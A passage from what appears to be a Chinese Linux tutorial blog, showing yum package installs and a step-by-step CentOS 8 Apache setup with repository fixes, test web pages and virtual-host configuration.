M确定吗？[y/N]： y下载软件包：(1/3): gpm-libs-1.20.7-17.el8.x86_64.rpm        15 kB/s |  39 kB     00:02    (2/3): vim-enhanced-8.0.1763-16.el8.x86_64.rpm 328 kB/s | 1.4 MB     00:04    (3/3): vim-common-8.0.1763-16.el8.x86_64.rpm   657 kB/s | 6.3 MB     00:09    -------------------------------------------------------------------------------总计                                           802 kB/s | 7.7 MB     00:09     运行事务检查事务检查成功。运行事务测试事务测试成功。运行事务  准备中  :                                                                1/1   安装    : vim-common-2:8.0.1763-16.el8.x86_64                            1/3   安装    : gpm-libs-1.20.7-17.el8.x86_64                                  2/3   运行脚本: gpm-libs-1.20.7-17.el8.x86_64                                  2/3   安装    : vim-enhanced-2:8.0.1763-16.el8.x86_64                          3/3   运行脚本: vim-enhanced-2:8.0.1763-16.el8.x86_64                          3/3   运行脚本: vim-common-2:8.0.1763-16.el8.x86_64                            3/3   验证    : gpm-libs-1.20.7-17.el8.x86_64                                  1/3   验证    : vim-common-2:8.0.1763-16.el8.x86_64                            2/3   验证    : vim-enhanced-2:8.0.1763-16.el8.x86_64                          3/3 已安装:  vim-enhanced-2:8.0.1763-16.el8.x86_64      gpm-libs-1.20.7-17.el8.x86_64       vim-common-2:8.0.1763-16.el8.x86_64       完毕！[root@wyf 桌面]# vim 111.txt                #可以执行vim命令[root@wyf 桌面]# \n\n3.使用vim安装vsftpd12345678910111213141516171819202122232425262728293031323334353637[root@wyf 桌面]# yum install vsftpd上次元数据过期检查：0:05:46 前，执行于 2025年08月05日 星期二 16时52分02秒。依赖关系解决。=============================================================================== 软件包         架构           版本                    仓库               大小===============================================================================安装: vsftpd         x86_64         3.0.3-34.el8            AppStream         181 k事务概要===============================================================================安装  1 软件包总下载：181 k安装大小：347 k确定吗？[y/N]： y下载软件包：vsftpd-3.0.3-34.el8.x86_64.rpm                  79 kB/s | 181 kB     00:02    -------------------------------------------------------------------------------总计                                            79 kB/s | 181 kB     00:02     运行事务检查事务检查成功。运行事务测试事务测试成功。运行事务  准备中  :                                                                1/1   安装    : vsftpd-3.0.3-34.el8.x86_64                                     1/1   运行脚本: vsftpd-3.0.3-34.el8.x86_64                                     1/1   验证    : vsftpd-3.0.3-34.el8.x86_64                                     1/1 已安装:  vsftpd-3.0.3-34.el8.x86_64                                                   完毕！[root@wyf 桌面]# vsftpd -vvsftpd: version 3.0.3[root@wyf 桌面]# \n\n总结：Yum 是 RHEL&#x2F;CentOS&#x2F;Fedora (旧版) 生态系统中不可或缺的强大工具，它极大地简化了 RPM 软件包的管理，特别是通过自动化解决依赖关系。掌握 yum install, yum update, yum remove, yum search, yum info, yum repolist, yum clean 和 yum history 等核心命令，以及理解仓库的概念，是有效管理这些 Linux 系统的基础。随着系统演进，dnf 正逐步取代 yum 成为默认，但 yum 的知识在大量现有服务器中仍然非常实用且迁移到 dnf 也很平滑。\n","slug":"软件管理","date":"2025-08-05T02:29:13.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"5540636afadbe0155c236ea46fdabfe2","title":"CentOS 8 Apache搭建","content":"CentOS 8 Apache搭建一、前置知识linux文件系统结构基础&#x2F;etc 配置文件存放的目录 \n&#x2F;var 动态数据存储 \nls cd mkdir chmod chown vim  \nsystemctl\nfirewall\n网络基础IP地址和端口 \napache 默认监听 \nhttp://localhost :80 \nhttps:&#x2F;&#x2F;**:443 \nDNS和域名解析 \nC:\\windows\\system32\\drivers\\hosts \n&#x2F;etc&#x2F;hosts\n用户和权限apache默认以apache用户运行 \n我们用root开启服务\n二、搭建Apache1dnf install httpd -y\n\n如果按照以前的内容搭建的CentOS 8 ，可能会报错\n123456789101112[root@wyf ~]# yum install httpdCentOS-8 - AppStream                                                     7.7 kB/s | 1.5 kB     00:00    CentOS-8 - Base                                                          5.9 kB/s | 1.5 kB     00:00    CentOS-8 - Extras                                                        7.0 kB/s | 1.5 kB     00:00    模块依赖问题 问题 1: conflicting requests  - nothing provides module(perl:5.26) needed by module perl-DBD-SQLite:1.58:8010020191114033549:073fa5fe-0.x86_64 问题 2: conflicting requests  - nothing provides module(perl:5.26) needed by module perl-DBI:1.641:8010020191113222731:16b3ab4d-0.x86_64未找到匹配的参数： httpd错误：没有任何匹配: httpd\n\n有以下解决方案：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163# 备份原有仓库配置[root@wyf ~]# mkdir /etc/yum.repos.d/backup[root@wyf ~]# mv /etc/yum.repos.d/CentOS-*.repo /etc/yum.repos.d/backup/# 下载新的仓库配置[root@wyf ~]# curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  2495  100  2495    0     0    771      0  0:00:03  0:00:03 --:--:--   771[root@wyf ~]# curl -o /etc/yum.repos.d/epel.repo https://mirrors.aliyun.com/repo/epel-archive-8.repo  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   521  100   521    0     0    278      0  0:00:01  0:00:01 --:--:--   278# 清理并重建缓存[root@wyf ~]# dnf clean all15 文件已删除[root@wyf ~]# rm -rf /var/cache/dnf[root@wyf ~]# dnf makecacheCentOS-8.5.2111 - Base - mirrors.aliyun.com                              422 kB/s | 4.6 MB     00:11    CentOS-8.5.2111 - Extras - mirrors.aliyun.com                            5.8 kB/s |  10 kB     00:01    CentOS-8.5.2111 - AppStream - mirrors.aliyun.com                         1.5 MB/s | 8.4 MB     00:05    Extra Packages for Enterprise Linux 8 - x86_64                           666 kB/s | 6.4 MB     00:09    元数据缓存已建立。# 启用 Perl 5.26 模块流[root@wyf ~]# dnf module enable perl:5.26 -y上次元数据过期检查：0:00:14 前，执行于 2025年08月04日 星期一 17时52分14秒。依赖关系解决。========================================================================================================= 软件包                  架构                   版本                       仓库                     大小=========================================================================================================启用模块流: perl                                           5.26                                                    事务概要=========================================================================================================完毕！# 启用 httpd 模块[root@wyf ~]# dnf module enable httpd:2.4 -y上次元数据过期检查：0:00:22 前，执行于 2025年08月04日 星期一 17时52分14秒。依赖关系解决。========================================================================================================= 软件包                  架构                   版本                       仓库                     大小=========================================================================================================启用模块流: httpd                                          2.4                                                     事务概要=========================================================================================================完毕！#安装 httpd[root@wyf ~]# dnf install httpd -y上次元数据过期检查：0:00:30 前，执行于 2025年08月04日 星期一 17时52分14秒。依赖关系解决。========================================================================================================= 软件包                  架构        版本                                           仓库            大小=========================================================================================================安装: httpd                   x86_64      2.4.37-43.module_el8.5.0+1022+b541f3b1         AppStream      1.4 M安装依赖关系: centos-logos-httpd      noarch      85.8-2.el8                                     base            75 k apr                     x86_64      1.6.3-12.el8                                   AppStream      129 k apr-util                x86_64      1.6.1-6.el8                                    AppStream      105 k httpd-filesystem        noarch      2.4.37-43.module_el8.5.0+1022+b541f3b1         AppStream       39 k httpd-tools             x86_64      2.4.37-43.module_el8.5.0+1022+b541f3b1         AppStream      107 k mod_http2               x86_64      1.15.7-3.module_el8.4.0+778+c970deab           AppStream      154 k安装弱的依赖: apr-util-bdb            x86_64      1.6.1-6.el8                                    AppStream       25 k apr-util-openssl        x86_64      1.6.1-6.el8                                    AppStream       27 k事务概要=========================================================================================================安装  9 软件包总下载：2.1 M安装大小：5.6 M下载软件包：(1/9): apr-util-1.6.1-6.el8.x86_64.rpm                                   210 kB/s | 105 kB     00:00    (2/9): centos-logos-httpd-85.8-2.el8.noarch.rpm                          142 kB/s |  75 kB     00:00    (3/9): apr-1.6.3-12.el8.x86_64.rpm                                       226 kB/s | 129 kB     00:00    (4/9): apr-util-bdb-1.6.1-6.el8.x86_64.rpm                               166 kB/s |  25 kB     00:00    (5/9): apr-util-openssl-1.6.1-6.el8.x86_64.rpm                            83 kB/s |  27 kB     00:00    (6/9): httpd-filesystem-2.4.37-43.module_el8.5.0+1022+b541f3b1.noarch.rp 134 kB/s |  39 kB     00:00    (7/9): httpd-tools-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64.rpm     380 kB/s | 107 kB     00:00    (8/9): mod_http2-1.15.7-3.module_el8.4.0+778+c970deab.x86_64.rpm         596 kB/s | 154 kB     00:00    (9/9): httpd-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64.rpm           1.6 MB/s | 1.4 MB     00:00    ---------------------------------------------------------------------------------------------------------总计                                                                     1.4 MB/s | 2.1 MB     00:01     运行事务检查事务检查成功。运行事务测试事务测试成功。运行事务  准备中  :                                                                                          1/1   安装    : apr-1.6.3-12.el8.x86_64                                                                  1/9   运行脚本: apr-1.6.3-12.el8.x86_64                                                                  1/9   安装    : apr-util-bdb-1.6.1-6.el8.x86_64                                                          2/9   安装    : apr-util-openssl-1.6.1-6.el8.x86_64                                                      3/9   安装    : apr-util-1.6.1-6.el8.x86_64                                                              4/9   运行脚本: apr-util-1.6.1-6.el8.x86_64                                                              4/9   安装    : httpd-tools-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                5/9   运行脚本: httpd-filesystem-2.4.37-43.module_el8.5.0+1022+b541f3b1.noarch                           6/9   安装    : httpd-filesystem-2.4.37-43.module_el8.5.0+1022+b541f3b1.noarch                           6/9   安装    : centos-logos-httpd-85.8-2.el8.noarch                                                     7/9   安装    : mod_http2-1.15.7-3.module_el8.4.0+778+c970deab.x86_64                                    8/9   安装    : httpd-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                      9/9   运行脚本: httpd-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                      9/9   验证    : centos-logos-httpd-85.8-2.el8.noarch                                                     1/9   验证    : apr-1.6.3-12.el8.x86_64                                                                  2/9   验证    : apr-util-1.6.1-6.el8.x86_64                                                              3/9   验证    : apr-util-bdb-1.6.1-6.el8.x86_64                                                          4/9   验证    : apr-util-openssl-1.6.1-6.el8.x86_64                                                      5/9   验证    : httpd-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                      6/9   验证    : httpd-filesystem-2.4.37-43.module_el8.5.0+1022+b541f3b1.noarch                           7/9   验证    : httpd-tools-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                8/9   验证    : mod_http2-1.15.7-3.module_el8.4.0+778+c970deab.x86_64                                    9/9 已安装:  httpd-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                                      apr-util-bdb-1.6.1-6.el8.x86_64                                                                          apr-util-openssl-1.6.1-6.el8.x86_64                                                                      centos-logos-httpd-85.8-2.el8.noarch                                                                     apr-1.6.3-12.el8.x86_64                                                                                  apr-util-1.6.1-6.el8.x86_64                                                                              httpd-filesystem-2.4.37-43.module_el8.5.0+1022+b541f3b1.noarch                                           httpd-tools-2.4.37-43.module_el8.5.0+1022+b541f3b1.x86_64                                                mod_http2-1.15.7-3.module_el8.4.0+778+c970deab.x86_64                                                  完毕！#验证安装[root@wyf ~]# httpd -vServer version: Apache/2.4.37 (centos)Server built:   Nov 12 2021 04:57:27[root@wyf ~]# systemctl start httpd[root@wyf ~]# systemctl status httpd● httpd.service - The Apache HTTP Server   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)   Active: active (running) since Mon 2025-08-04 18:05:16 CST; 20s ago     Docs: man:httpd.service(8) Main PID: 42463 (httpd)   Status: &quot;Started, listening on: port 80&quot;    Tasks: 213 (limit: 23821)   Memory: 31.6M   CGroup: /system.slice/httpd.service           ├─42463 /usr/sbin/httpd -DFOREGROUND           ├─42476 /usr/sbin/httpd -DFOREGROUND           ├─42477 /usr/sbin/httpd -DFOREGROUND           ├─42478 /usr/sbin/httpd -DFOREGROUND           └─42479 /usr/sbin/httpd -DFOREGROUND8月 04 18:04:51 wyf systemd[1]: Starting The Apache HTTP Server...8月 04 18:05:16 wyf httpd[42463]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualif&gt;8月 04 18:05:16 wyf systemd[1]: Started The Apache HTTP Server.8月 04 18:05:32 wyf httpd[42463]: Server configured, listening on: port 80[root@wyf ~]# \n\n在安装完以后，我们可以检查apache配置文件\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 主配置文件[root@wyf ~]# ls -l /etc/httpd/conf/httpd.conf-rw-r--r--. 1 root root 11899 11月 12 2021 /etc/httpd/conf/httpd.conf# 虚拟主机配置目录[root@wyf ~]# ls -l /etc/httpd/conf.d/总用量 16-rw-r--r--. 1 root root 2926 11月 12 2021 autoindex.conf-rw-r--r--. 1 root root  400 11月 12 2021 README-rw-r--r--. 1 root root 1252 11月 12 2021 userdir.conf-rw-r--r--. 1 root root  574 11月 12 2021 welcome.conf# 自定义配置文件（如 mywebsite.conf）[root@wyf ~]# ls -l /etc/httpd/conf.d/mywebsite.conf# 检查系统新增的系统服务[root@wyf ~]# systemctl list-unit-files | grep httpdhttpd.service                              disabled httpd@.service                             disabled httpd.socket                               disabled # 检查新增的apache进程[root@wyf ~]# ps aux | grep httpdroot      42463  0.0  0.2 280212 11128 ?        Ss   18:04   0:00 /usr/sbin/httpd -DFOREGROUNDapache    42476  0.0  0.2 292428  8392 ?        S    18:05   0:00 /usr/sbin/httpd -DFOREGROUNDapache    42477  0.0  0.3 1809000 11832 ?       Sl   18:05   0:00 /usr/sbin/httpd -DFOREGROUNDapache    42478  0.0  0.5 1940140 20000 ?       Sl   18:05   0:00 /usr/sbin/httpd -DFOREGROUNDapache    42479  0.0  0.3 1809000 11832 ?       Sl   18:05   0:00 /usr/sbin/httpd -DFOREGROUNDroot      42879  0.0  0.0  12320   964 pts/0    S+   18:17   0:00 grep --color=auto httpd# 检查新增的日志文件[root@wyf ~]# ls -l /var/log/httpd/总用量 4-rw-r--r--. 1 root root    0 8月   4 18:05 access_log-rw-r--r--. 1 root root 1030 8月   4 18:05 error_log# 检查新增的用户和组[root@wyf ~]# grep apache /etc/passwdapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin[root@wyf ~]# grep apache /etc/groupapache:x:48:[root@wyf ~]# tail -3 /etc/passwdtcpdump:x:72:72::/:/sbin/nologinwyf:x:1000:1000:wyf:/home/wyf:/bin/bashapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n\n在&#x2F;var&#x2F;www&#x2F;html目录下创建index.html作为默认网页\n1[root@wyf html]# vim index.html\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Apache服务测试页面&lt;/title&gt;    &lt;style&gt;        body &#123;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;            max-width: 800px;            margin: 0 auto;            padding: 20px;            background-color: #f5f5f5;            color: #333;        &#125;        header &#123;            text-align: center;            padding: 30px 0;            background-color: #2c3e50;            color: white;            border-radius: 8px;            margin-bottom: 30px;        &#125;        .success-badge &#123;            background-color: #2ecc71;            color: white;            padding: 8px 15px;            border-radius: 20px;            display: inline-block;            font-weight: bold;        &#125;        .box &#123;            background: white;            padding: 25px;            border-radius: 8px;            box-shadow: 0 3px 10px rgba(0,0,0,0.1);            margin-bottom: 25px;        &#125;        footer &#123;            text-align: center;            margin-top: 30px;            color: #7f8c8d;            font-size: 0.9em;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;header&gt;        &lt;h1&gt;Apache服务运行成功！&lt;/h1&gt;        &lt;div class=&quot;success-badge&quot;&gt;状态：正常运行&lt;/div&gt;    &lt;/header&gt;        &lt;main&gt;        &lt;div class=&quot;box&quot;&gt;            &lt;h2&gt;服务器信息&lt;/h2&gt;            &lt;p&gt;您的Apache HTTP服务器已正确配置并运行。&lt;/p&gt;            &lt;p&gt;当前时间：&lt;span id=&quot;currentTime&quot;&gt;&lt;/span&gt;&lt;/p&gt;        &lt;/div&gt;                &lt;div class=&quot;box&quot;&gt;            &lt;h2&gt;后续步骤&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;将您的网站文件放入服务器的文档根目录&lt;/li&gt;                &lt;li&gt;配置文件虚拟主机（Virtual Host）&lt;/li&gt;                &lt;li&gt;安装SSL证书启用HTTPS&lt;/li&gt;                &lt;li&gt;访问 &lt;code&gt;http://localhost/server-status&lt;/code&gt; 查看服务器状态&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/main&gt;        &lt;footer&gt;        &lt;p&gt;由Apache HTTP Server提供支持 | 文档根目录: &lt;code&gt;/var/www/html&lt;/code&gt;&lt;/p&gt;    &lt;/footer&gt;    &lt;script&gt;        // 显示当前时间        function updateTime() &#123;            const now = new Date();            document.getElementById(&#x27;currentTime&#x27;).textContent =                 now.toLocaleString(&#x27;zh-CN&#x27;, &#123;                     year: &#x27;numeric&#x27;,                     month: &#x27;2-digit&#x27;,                    day: &#x27;2-digit&#x27;,                    hour: &#x27;2-digit&#x27;,                    minute: &#x27;2-digit&#x27;,                    second: &#x27;2-digit&#x27;,                    hour12: false                 &#125;);        &#125;        setInterval(updateTime, 1000);        updateTime();    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n测试\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394[root@wyf html]# curl http://localhost&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Apache服务测试页面&lt;/title&gt;    &lt;style&gt;        body &#123;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;            max-width: 800px;            margin: 0 auto;            padding: 20px;            background-color: #f5f5f5;            color: #333;        &#125;        header &#123;            text-align: center;            padding: 30px 0;            background-color: #2c3e50;            color: white;            border-radius: 8px;            margin-bottom: 30px;        &#125;        .success-badge &#123;            background-color: #2ecc71;            color: white;            padding: 8px 15px;            border-radius: 20px;            display: inline-block;            font-weight: bold;        &#125;        .box &#123;            background: white;            padding: 25px;            border-radius: 8px;            box-shadow: 0 3px 10px rgba(0,0,0,0.1);            margin-bottom: 25px;        &#125;        footer &#123;            text-align: center;            margin-top: 30px;            color: #7f8c8d;            font-size: 0.9em;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;header&gt;        &lt;h1&gt;Apache服务运行成功！&lt;/h1&gt;        &lt;div class=&quot;success-badge&quot;&gt;状态：正常运行&lt;/div&gt;    &lt;/header&gt;        &lt;main&gt;        &lt;div class=&quot;box&quot;&gt;            &lt;h2&gt;服务器信息&lt;/h2&gt;            &lt;p&gt;您的Apache HTTP服务器已正确配置并运行。&lt;/p&gt;            &lt;p&gt;当前时间：&lt;span id=&quot;currentTime&quot;&gt;&lt;/span&gt;&lt;/p&gt;        &lt;/div&gt;                &lt;div class=&quot;box&quot;&gt;            &lt;h2&gt;后续步骤&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;将您的网站文件放入服务器的文档根目录&lt;/li&gt;                &lt;li&gt;配置文件虚拟主机（Virtual Host）&lt;/li&gt;                &lt;li&gt;安装SSL证书启用HTTPS&lt;/li&gt;                &lt;li&gt;访问 &lt;code&gt;http://localhost/server-status&lt;/code&gt; 查看服务器状态&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/main&gt;        &lt;footer&gt;        &lt;p&gt;由Apache HTTP Server提供支持 | 文档根目录: &lt;code&gt;/var/www/html&lt;/code&gt;&lt;/p&gt;    &lt;/footer&gt;    &lt;script&gt;        // 显示当前时间        function updateTime() &#123;            const now = new Date();            document.getElementById(&#x27;currentTime&#x27;).textContent =                 now.toLocaleString(&#x27;zh-CN&#x27;, &#123;                     year: &#x27;numeric&#x27;,                     month: &#x27;2-digit&#x27;,                    day: &#x27;2-digit&#x27;,                    hour: &#x27;2-digit&#x27;,                    minute: &#x27;2-digit&#x27;,                    second: &#x27;2-digit&#x27;,                    hour12: false                 &#125;);        &#125;        setInterval(updateTime, 1000);        updateTime();    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n123456789[root@wyf html]# ifconfigens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.232.145  netmask 255.255.255.0  broadcast 192.168.232.255        inet6 fe80::e68e:b63:f059:7dcf  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:d0:f2:6b  txqueuelen 1000  (Ethernet)        RX packets 2437  bytes 2788593 (2.6 MiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 908  bytes 77394 (75.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n在主机输入IP地址能够访问：\n\n1[root@wyf html]# chown apache:apache /var/www/html/index.html\n\n\n权限控制Apache 服务默认以 apache 用户身份运行（某些系统使用 www-data），设置后：\nApache 有权读取&#x2F;执行该文件\n防止其他用户误修改\n\n\n安全性避免使用 root 权限运行 web 文件，降低攻击风险\n系统一致性保持整个 web 目录（/var/www/html/）权限统一\n\n三、在Apache中创建第二个网站（不删除原界面）虚拟主机 \n是apache的核心功能 \n允许单台服务器通过不同的域名、IP、或者端口托管多个独立网站 \n本质就是通过配置区分不同网站的请求，引导到不同的目录或者后端服务\n12345678三种类型#基于域名    不同域名访问不同网站      referencer                                 在你访问web界面时，出现3xx 403字段时，可以尝试更改refer字段为                                 127.0.0.1\\baidu.com                                 a.com b.com指向同一个服务器基于IP     不同IP地址访问不同网站    服务器有多个公网IP基于端口    不同端口访问不同网站      80：访问官网 8080：访问后台\n\n流程 \n用户访问study.com \napache会检查servername 和 serveralias \n匹配相应的虚拟主机配置 \n返回内容\n1234567&lt;VirtualHost *:80&gt;\tServerName study.example.com     # 主域名  \tServerAlias www.study.example.com  # 备用域名\tDocumentRoot /var/www/study/html   # 网站根目录\tErrorLog /var/log/httpd/study_error.log  # 错误日志\tCustomLog /var/log/httpd/study_access.log combined  # 访问日志&lt;/VirtualHost&gt;\n\n创建新网站123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297[root@wyf var]# mkdir -p /var/www/study/html /var/www/study/log[root@wyf var]# cd www/study/html[root@wyf html]# pwd/var/www/study/html[root@wyf html]# vim index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;简单HTML页面示例&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css&quot;&gt;    &lt;style&gt;        * &#123;            margin: 0;            padding: 0;            box-sizing: border-box;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;        &#125;                body &#123;            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);            color: #333;            min-height: 100vh;            padding: 20px;            line-height: 1.6;        &#125;                .container &#123;            max-width: 1200px;            margin: 0 auto;        &#125;                header &#123;            text-align: center;            padding: 40px 0;            color: white;            animation: fadeInDown 1s ease;        &#125;                header h1 &#123;            font-size: 3.5rem;            margin-bottom: 10px;            text-shadow: 0 2px 5px rgba(0,0,0,0.2);        &#125;                header p &#123;            font-size: 1.2rem;            max-width: 600px;            margin: 0 auto;            opacity: 0.9;        &#125;                .main-content &#123;            display: flex;            flex-wrap: wrap;            gap: 25px;            margin-top: 20px;        &#125;                .card &#123;            background: rgba(255, 255, 255, 0.95);            border-radius: 15px;            padding: 30px;            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);            flex: 1;            min-width: 300px;            transition: transform 0.3s ease, box-shadow 0.3s ease;        &#125;                .card:hover &#123;            transform: translateY(-10px);            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);        &#125;                .card h2 &#123;            color: #2575fc;            margin-bottom: 20px;            padding-bottom: 10px;            border-bottom: 2px solid #eee;        &#125;                .features &#123;            display: flex;            flex-wrap: wrap;            gap: 20px;            margin-top: 40px;        &#125;                .feature-box &#123;            background: white;            border-radius: 12px;            padding: 25px;            text-align: center;            flex: 1;            min-width: 250px;            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);        &#125;                .feature-box i &#123;            font-size: 3rem;            color: #6a11cb;            margin-bottom: 15px;        &#125;                .btn &#123;            display: inline-block;            background: linear-gradient(to right, #6a11cb, #2575fc);            color: white;            padding: 12px 30px;            border-radius: 50px;            text-decoration: none;            font-weight: bold;            margin-top: 15px;            border: none;            cursor: pointer;            transition: all 0.3s ease;            box-shadow: 0 4px 15px rgba(106, 17, 203, 0.3);        &#125;                .btn:hover &#123;            transform: translateY(-3px);            box-shadow: 0 7px 20px rgba(106, 17, 203, 0.4);        &#125;                .gallery &#123;            display: grid;            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));            gap: 15px;            margin-top: 30px;        &#125;                .gallery img &#123;            width: 100%;            border-radius: 10px;            transition: transform 0.3s ease;        &#125;                .gallery img:hover &#123;            transform: scale(1.05);        &#125;                footer &#123;            text-align: center;            padding: 40px 0;            margin-top: 50px;            color: white;            border-top: 1px solid rgba(255, 255, 255, 0.2);        &#125;                form &#123;            display: flex;            flex-direction: column;            gap: 15px;        &#125;                input, textarea &#123;            padding: 12px;            border-radius: 8px;            border: 1px solid #ddd;            font-size: 1rem;        &#125;                input:focus, textarea:focus &#123;            outline: none;            border-color: #6a11cb;            box-shadow: 0 0 0 3px rgba(106, 17, 203, 0.1);        &#125;                @keyframes fadeInDown &#123;            from &#123;                opacity: 0;                transform: translateY(-20px);            &#125;            to &#123;                opacity: 1;                transform: translateY(0);            &#125;        &#125;                @media (max-width: 768px) &#123;            header h1 &#123;                font-size: 2.5rem;            &#125;                        .main-content &#123;                flex-direction: column;            &#125;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;header&gt;            &lt;h1&gt;欢迎来到简单HTML页面&lt;/h1&gt;            &lt;p&gt;这是一个使用纯HTML和CSS创建的响应式网页示例，展示了现代网页设计的基本元素&lt;/p&gt;        &lt;/header&gt;                &lt;div class=&quot;main-content&quot;&gt;            &lt;div class=&quot;card&quot;&gt;                &lt;h2&gt;关于这个页面&lt;/h2&gt;                &lt;p&gt;这个简单的HTML页面展示了现代网页设计的基本元素，包括响应式布局、卡片设计、交互效果和美观的UI组件。&lt;/p&gt;                &lt;p&gt;页面使用纯HTML和CSS实现，没有依赖任何JavaScript框架或库。&lt;/p&gt;                &lt;p&gt;所有元素都采用了现代化的设计风格，包括柔和的阴影、平滑的过渡效果和吸引人的颜色渐变。&lt;/p&gt;                &lt;a href=&quot;#&quot; class=&quot;btn&quot;&gt;了解更多&lt;/a&gt;            &lt;/div&gt;                        &lt;div class=&quot;card&quot;&gt;                &lt;h2&gt;HTML5特性&lt;/h2&gt;                &lt;p&gt;这个页面使用了多种HTML5特性：&lt;/p&gt;                &lt;ul&gt;                    &lt;li&gt;语义化标签（header, footer）&lt;/li&gt;                    &lt;li&gt;CSS3动画和过渡效果&lt;/li&gt;                    &lt;li&gt;Flexbox和Grid布局&lt;/li&gt;                    &lt;li&gt;响应式设计（适应不同屏幕尺寸）&lt;/li&gt;                    &lt;li&gt;渐变背景和卡片阴影&lt;/li&gt;                &lt;/ul&gt;                &lt;p&gt;尝试调整浏览器窗口大小，查看响应式效果！&lt;/p&gt;                &lt;button class=&quot;btn&quot;&gt;查看示例&lt;/button&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;div class=&quot;features&quot;&gt;            &lt;div class=&quot;feature-box&quot;&gt;                &lt;i class=&quot;fas fa-mobile-alt&quot;&gt;&lt;/i&gt;                &lt;h3&gt;响应式设计&lt;/h3&gt;                &lt;p&gt;页面布局会自动适应不同屏幕尺寸，在手机、平板和桌面设备上都能完美显示。&lt;/p&gt;            &lt;/div&gt;                        &lt;div class=&quot;feature-box&quot;&gt;                &lt;i class=&quot;fas fa-paint-brush&quot;&gt;&lt;/i&gt;                &lt;h3&gt;现代UI&lt;/h3&gt;                &lt;p&gt;使用卡片设计、柔和阴影和精心选择的颜色方案，创造视觉吸引力。&lt;/p&gt;            &lt;/div&gt;                        &lt;div class=&quot;feature-box&quot;&gt;                &lt;i class=&quot;fas fa-bolt&quot;&gt;&lt;/i&gt;                &lt;h3&gt;快速加载&lt;/h3&gt;                &lt;p&gt;优化代码确保页面加载快速，提供流畅的用户体验。&lt;/p&gt;            &lt;/div&gt;                        &lt;div class=&quot;feature-box&quot;&gt;                &lt;i class=&quot;fas fa-code&quot;&gt;&lt;/i&gt;                &lt;h3&gt;语义化HTML&lt;/h3&gt;                &lt;p&gt;使用正确的HTML标签，提高可访问性和SEO优化。&lt;/p&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;div class=&quot;card&quot; style=&quot;margin-top: 40px;&quot;&gt;            